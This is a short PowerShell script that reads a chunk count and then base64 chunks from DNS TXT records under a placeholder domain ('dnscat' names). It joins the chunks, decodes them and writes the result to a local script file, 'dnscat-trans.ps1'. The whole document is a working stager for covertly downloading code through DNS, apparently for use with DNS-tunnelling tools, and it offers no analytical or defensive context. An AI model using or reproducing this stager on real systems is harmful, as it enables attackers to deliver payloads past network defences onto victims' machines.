$d="my.domain.co.uk"
# If PS 3 use the below
 #$dr=(Resolve-DnsName -Name "dnscatcount.$d" -Type txt).Strings
# Else if PS 2
 $cm="dnscatcount.$d"
 $co=(Invoke-Command -ScriptBlock {nslookup -type=txt $cm} 2>$null)
 $coa=([String]$co).Split('"')
 $dr=$coa[6]
# Endif
$c=[convert]::ToInt32($dr,10)
$o=@()
for ($i=1;$i -le $c;$i++)
{
    $n="dnscat" + $i.toString() + ".$d"
	# if PS 2
    $co=(Invoke-Command -ScriptBlock {nslookup -type=txt $n} 2>$null)
    $coa=([String]$co).Split('"')
    $dr=$coa[6]	
    $o+=$dr
    Start-Sleep -s 1
	# else if PS 3
    #$o+=(Resolve-DnsName -Name $n -Type txt).Strings
}
$b64=-join $o
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) | Add-Content "dnscat-trans.ps1"